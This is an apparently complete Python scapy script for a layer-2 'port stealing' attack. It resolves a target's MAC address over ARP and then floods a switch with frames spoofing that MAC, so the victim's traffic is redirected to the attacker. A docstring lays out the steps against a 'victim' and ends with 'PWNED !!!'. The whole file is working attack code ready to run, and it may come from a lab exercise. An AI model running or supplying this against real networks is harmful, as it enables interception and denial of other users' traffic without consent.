#!/usr/bin/env python
from scapy.all import *

"""
HOW TO :

- start ICMP tcpdump on victim (tcpdump icmp)
- start a ping from source machine to victim
- start icmp-responder.py on hacker (no activity for now)
- start this script on hacker
- Show ICMP logs on hacker
- Show missing ICMP logs on victim
- PWNED !!!
"""

def get_mac_from_ip(ip):
    # broadcast ARP opcode 1 to retrieve MAC address
    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
    mac = srp(arp_packet, timeout=2, verbose=False, iface='eth1')[0][0][1].hwsrc
    return mac


def steal_port(target_ip, target_mac):
    # set the source MAC as the target MAC
    # the switch will update his forwarding database
    spoofed_request = Ether(src=target_mac)/IP(dst=target_ip)
    sendp(spoofed_request, verbose=False, iface='eth1')


def main():
    target_ip = input("target IP (connected to the same switch) :")

    try:
        target_mac = get_mac_from_ip(target_ip)
        print("target MAC", target_mac)
    except:
        print("No MAC found for target")
        quit()

    try:
        print("Port stealing in progress...")
        while True:
            print("Sending packet with", target_mac)
            steal_port(target_ip, target_mac)
            time.sleep(1)
    except KeyboardInterrupt:
        quit()


if __name__ == "__main__":
    main()
